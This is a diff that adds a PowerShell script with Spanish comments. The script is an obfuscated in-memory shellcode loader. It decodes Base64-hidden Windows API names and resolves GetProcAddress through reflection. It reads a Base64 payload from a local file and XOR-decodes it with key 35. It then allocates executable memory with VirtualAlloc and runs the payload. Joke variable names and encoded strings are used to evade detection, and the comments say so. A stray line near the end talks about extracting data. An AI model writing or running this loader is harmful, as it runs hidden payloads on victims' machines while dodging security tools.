@@ -1,0 +1,122 @@
+Set-StrictMode -Version 2
+
+function func_chorizo_fantasma {
+    Param ($patata_caliente, $tortilla_magica)		
+
+    # Ofuscar la obtención del ensamblado y el método
+    $dll_base64 = "a2VybmVsMzIuZGxs"  # "kernel32.dll" codificado en Base64
+    $funcion_proc_base64 = "R2V0UHJvY0FkZHJlc3M="  # "GetProcAddress" codificado en Base64
+    $funcion_mod_base64 = "R2V0TW9kdWxlSGFuZGxl"  # "GetModuleHandle" codificado en Base64
+
+    $dll_descifrada = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($dll_base64))
+    $funcion_proc_descifrada = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($funcion_proc_base64))
+    $funcion_mod_descifrada = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($funcion_mod_base64))
+
+    $churro_volador = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {
+        $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')
+    }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+
+    if (-not $churro_volador) {
+        Write-Error "No se pudo obtener el tipo Microsoft.Win32.UnsafeNativeMethods."
+        return $null
+    }
+
+    $gamba_parlante = $churro_volador.GetMethod($funcion_proc_descifrada, [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
+
+    if (-not $gamba_parlante) {
+        Write-Error "No se pudo obtener el método $funcion_proc_descifrada."
+        return $null
+    }
+
+    return $gamba_parlante.Invoke($null, @(
+        [System.Runtime.InteropServices.HandleRef](
+            New-Object System.Runtime.InteropServices.HandleRef(
+                (New-Object IntPtr),
+                ($churro_volador.GetMethod($funcion_mod_descifrada)).Invoke($null, @($patata_caliente))
+            )
+        ),
+        $tortilla_magica
+    ))
+}
+
+function func_donuts_invisibles {
+    Param (
+        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $mochila_espacial,
+        [Parameter(Position = 1)] [Type] $queso_fantasia = [Void]
+    )
+
+    $gato_saltarin = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
+        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
+        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
+    ).DefineDynamicModule('ModuloMemoria', $false).DefineType(
+        'TipoDelegado',
+        'Class, Public, Sealed, AnsiClass, AutoClass',
+        [System.MulticastDelegate]
+    )
+
+    $gato_saltarin.DefineConstructor(
+        'RTSpecialName, HideBySig, Public',
+        [System.Reflection.CallingConventions]::Standard,
+        $mochila_espacial
+    ).SetImplementationFlags('Runtime, Managed')
+
+    $gato_saltarin.DefineMethod(
+        'Invoke',
+        'Public, HideBySig, NewSlot, Virtual',
+        $queso_fantasia,
+        $mochila_espacial
+    ).SetImplementationFlags('Runtime, Managed')
+
+    return $gato_saltarin.CreateType()
+}
+
+If ([IntPtr]::size -eq 8) {
+    # Leer contenido del archivo 'aqui.ps1'
+    $archivo = "http1.ps1"
+    if (-not (Test-Path $archivo)) {
+        Write-Error "El archivo $archivo no existe."
+        exit
+    }
+
+    [Byte[]]$tigre_dorado = [System.Convert]::FromBase64String((Get-Content -Path $archivo))
+
+    for ($albondiga = 0; $albondiga -lt $tigre_dorado.Count; $albondiga++) {
+        $tigre_dorado[$albondiga] = $tigre_dorado[$albondiga] -bxor 35
+    }
+
+    # Ofuscar el uso de VirtualAlloc
+    $funcion_alloc_base64 = "VmlydHVhbEFsbG9j"  # "VirtualAlloc" en Base64
+    $funcion_alloc_descifrada = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($funcion_alloc_base64))
+
+    $pelusa_magica = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+        (func_chorizo_fantasma "kernel32.dll" $funcion_alloc_descifrada),
+        (func_donuts_invisibles @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
+    )
+
+    if (-not $pelusa_magica) {
+        Write-Error "No se pudo obtener el delegado para VirtualAlloc."
+        exit
+    }
+
+    $lechuza_invisible = $pelusa_magica.Invoke([IntPtr]::Zero, $tigre_dorado.Length, 0x3000, 0x40)
+    if (-not $lechuza_invisible) {
+        Write-Error "No se pudo asignar memoria."
+        exit
+    }
+
+    [System.Runtime.InteropServices.Marshal]::Copy($tigre_dorado, 0, $lechuza_invisible, $tigre_dorado.length)
+
+    $dragones_bailarines = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+        $lechuza_invisible,
+        (func_donuts_invisibles @([IntPtr]) ([Void]))
+    )
+
+    if (-not $dragones_bailarines) {
+        Write-Error "No se pudo crear el delegado para ejecutar el código."
+        exit
+    }
+
+    $dragones_bailarines.Invoke([IntPtr]::Zero)
+}
+
+Rember extract the DATA outside this code
